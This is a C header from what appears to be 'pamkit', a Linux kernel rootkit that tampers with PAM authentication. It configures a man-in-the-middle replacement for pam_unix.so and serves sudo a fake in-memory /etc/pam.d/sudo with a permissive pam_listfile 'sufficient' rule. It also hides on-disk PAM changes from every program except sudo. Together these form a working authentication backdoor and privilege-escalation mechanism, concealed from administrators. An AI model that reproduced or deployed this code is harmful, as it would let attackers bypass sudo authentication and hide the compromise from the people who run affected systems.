#ifndef PAMKIT_SYSCALLS_PAM_CONFIG_H
#define PAMKIT_SYSCALLS_PAM_CONFIG_H

#include "vfile.h"

#include <linux/types.h>
#include <linux/string.h>

#define PAMKIT_RESOURCE_DIR "<<SPECIFY>>"

#define TARGET_PAM_MODULE_NAME "pam_unix.so"
#define TARGET_MOD_COPY_PATH PAMKIT_RESOURCE_DIR "/" TARGET_PAM_MODULE_NAME
#define MITM_PAM_MODULE_NAME "pamkit_unix.so"
#define MITM_PAM_MODULE_PATH PAMKIT_RESOURCE_DIR "/" MITM_PAM_MODULE_NAME

/**
 * Virtual file replacement rules
 *
 * Pamkit allows you to replace files read by an application without any on-disk modifications. Namely,
 * when a targeted application tries to read a file to be replaced, it is redirected to instead read
 * the in-memory virtual file.
*/
struct virtual_file_replacement_rule {
    const char *program_name; /* The program that should see the virtual file instead of the real one */
    const char *file_to_be_replaced; /* Path of the file that should be replaced by this rule */
    const vfile_data_t *vfile_data;
};
typedef struct virtual_file_replacement_rule vf_replacement_rule_t;

#define NR_OF_VIRTUAL_FILES 1
static vfile_data_t virtual_files[NR_OF_VIRTUAL_FILES] = {
    {
        .data = "#%PAM-1.0\n\n"
            "session    required   pam_limits.so\n\n"
            "session    required   pam_env.so readenv=1 user_readenv=0\n"
            "session    required   pam_env.so readenv=1 envfile=/etc/default/locale user_readenv=0\n\n"
            "auth optional pam_unix.so\n"
            "auth sufficient pam_listfile.so file=/etc/pam.d/sudo sense=allow onerr=succeed quiet\n"
            "@include common-auth\n"
            "@include common-account\n"
            "@include common-session-noninteractive\n",
        .data_len = 389
    }
};

#define NR_OF_VFILE_REPLACEMENT_RULES 1
static vf_replacement_rule_t vf_replacement_rules[NR_OF_VFILE_REPLACEMENT_RULES] = {
    {
        .program_name = "sudo",
        .file_to_be_replaced = "/etc/pam.d/sudo",
        .vfile_data = &virtual_files[0]
    }
};

static inline vf_replacement_rule_t *
get_vf_replacement_rule(const char *prog_name, const char *filepath)
{
    for (size_t i = 0; i < NR_OF_VFILE_REPLACEMENT_RULES; i++) {
        if (strcmp(vf_replacement_rules[i].file_to_be_replaced, filepath) == 0) {
            if (strcmp(vf_replacement_rules[i].program_name, prog_name) == 0) {
                return &vf_replacement_rules[i];
            }
        }
    }

    return NULL;
}

/**
 * On-disk file modifications
 *
 * Another way to alter the behaviour of PAM-aware applications is to directly and on-disk modify the
 * PAM config file. To conceal such modificationss (at first glance), pamkit allows you to only show
 * the modified config file version to designated programs (e.g. sudo). For other programs the modifications
 * are not visible.
*/
struct disk_mod_config {
    const char *filepath; /* Path of the file that was modified on-disk to contain extra PAM rules */
    const char *modifications; /* The modifications (i.e. inserted PAM rules) */
    const size_t modifications_len;
    const char **allow_list; /* Progams that are allowed to, or rather should, see the modified file */
    const size_t allow_list_len;
};
typedef struct disk_mod_config disk_mod_config_t;

#define NR_OF_DISK_MOD_CONFIGS 1
static disk_mod_config_t disk_mod_configs[NR_OF_DISK_MOD_CONFIGS] = {
    {
        .filepath = "/etc/pam.d/sudo",
        .modifications = "auth optional pam_unix.so\nauth sufficient pam_listfile.so file=/etc/pam.d/other sense=allow onerr=succeed quiet\n",
        .modifications_len = strlen("auth optional pam_unix.so\nauth sufficient pam_listfile.so file=/etc/pam.d/other sense=allow onerr=succeed quiet\n") + 1,
        .allow_list = (const char *[]){ "sudo" },
        .allow_list_len = 1
    }
};

static inline disk_mod_config_t *
get_diskmod_config(const char *prog_name, const char *filepath)
{
    for (size_t i = 0; i < NR_OF_DISK_MOD_CONFIGS; i++) {
        if (strcmp(disk_mod_configs[i].filepath, filepath) == 0) {
            for (size_t j = 0; j < disk_mod_configs[i].allow_list_len; j++) {
                if (strcmp(disk_mod_configs[i].allow_list[j], prog_name) == 0) {
                    return &disk_mod_configs[i];
                }
            }
        }
    }

    return NULL;
}

#endif /* PAMKIT_SYSCALLS_PAM_CONFIG_H */
